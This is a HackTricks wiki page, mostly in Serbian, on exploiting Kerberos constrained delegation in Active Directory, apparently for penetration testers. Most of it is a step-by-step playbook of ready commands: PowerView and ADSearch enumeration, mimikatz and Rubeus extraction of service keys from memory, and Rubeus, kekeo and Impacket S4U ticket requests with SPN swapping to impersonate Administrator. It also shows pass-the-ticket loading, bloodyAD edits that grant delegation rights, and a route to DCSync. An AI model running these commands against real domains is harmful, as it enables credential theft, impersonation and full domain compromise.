# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Korišćenjem ovoga, Domain admin može **allow** računaru da **impersonate a user or computer** prema bilo kojem **service** na mašini.

- **Service for User to self (_S4U2self_):** Ako **service account** ima vrednost atributa _userAccountControl_ koja sadrži [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), onda može dobiti TGS za sebe (service) u ime bilo kog drugog korisnika.
- **Service for User to Proxy(_S4U2proxy_):** **Service account** može dobiti TGS u ime bilo kog korisnika ka servisu navedenom u **msDS-AllowedToDelegateTo.** Da bi to uradio, prvo mu treba TGS od tog korisnika ka sebi, ali može koristiti S4U2self da dobije taj TGS pre nego što zatraži drugi.

**Note**: Ako je korisnik označen kao ‘_Account is sensitive and cannot be delegated_’ u AD, nećete moći da **impersonate** njih.

To znači da ako **compromise the hash of the service** možete **impersonate users** i dobiti **access** u njihovo ime ka bilo kojem **service** na navedenim mašinama (mogući **privesc**).

Štaviše, nećete imati pristup samo servisu koji korisnik može da impersonate, već i bilo kojem servisu, zato što se SPN (ime servisa koje se zahteva) ne proverava (u ticketu taj deo nije enkriptovan/potpisan). Zato, ako imate pristup **CIFS service**, možete takođe imati pristup **HOST service** koristeći flag `/altservice` u Rubeus, na primer. Istu slabost u SPN swapping-u zloupotrebljavaju **Impacket getST -altservice** i drugi alati.

Takođe, **LDAP service access on DC** je ono što je potrebno da se iskorišti **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Beleške o Cross-domain constrained delegation (2025+)

Od **Windows Server 2012/2012 R2** KDC podržava **constrained delegation across domains/forests** putem S4U2Proxy ekstenzija. Moderni buildovi (Windows Server 2016–2025) zadržavaju ovo ponašanje i dodaju dva PAC SIDs da signaliziraju protocol transition:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) kada se korisnik normalno autentifikovao.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) kada je servis potvrdio identitet putem protocol transition.

Očekujte `SERVICE_ASSERTED_IDENTITY` unutar PAC-a kada se protocol transition koristi across domains, što potvrđuje da je S4U2Proxy korak uspeo.

### Impacket / Linux alatke (altservice & full S4U)

Noviji Impacket (0.11.x+) izlaže isti S4U chain i SPN swapping kao Rubeus:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
Ako više voliš prvo falsifikovati korisnički ST (npr. samo offline hash), upari **ticketer.py** sa **getST.py** za **S4U2Proxy**. Pogledaj otvoreni Impacket issue #1713 za aktuelne specifičnosti (KRB_AP_ERR_MODIFIED kada falsifikovani ST ne odgovara SPN ključu).

### Automatizacija podešavanja delegacije iz low-priv creds

Ako već poseduješ **GenericAll/WriteDACL** nad računarom ili **service account**, možeš udaljeno postaviti potrebne atribute bez **RSAT** koristeći **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Ovo vam omogućava da izgradite constrained delegation path za privesc bez DA privilegija čim možete upisati te atribute.

- Step 1: **Dobijte TGT dozvoljenog servisa**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Postoje i **drugi načini da se dođe do TGT ticket** ili **RC4** ili **AES256** bez toga da budete **SYSTEM** na računaru, kao što su **Printer Bug**, **unconstrain delegation**, **NTLM relaying** i **Active Directory Certificate Service abuse**
>
> **Samo posedovanje tog TGT ticket (ili hashed) vam omogućava izvođenje ovog napada bez kompromitovanja celog računara.**

- Korak 2: **Dobijte TGS za servis koji se predstavlja kao korisnik**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Više informacija na ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) i [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Reference
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
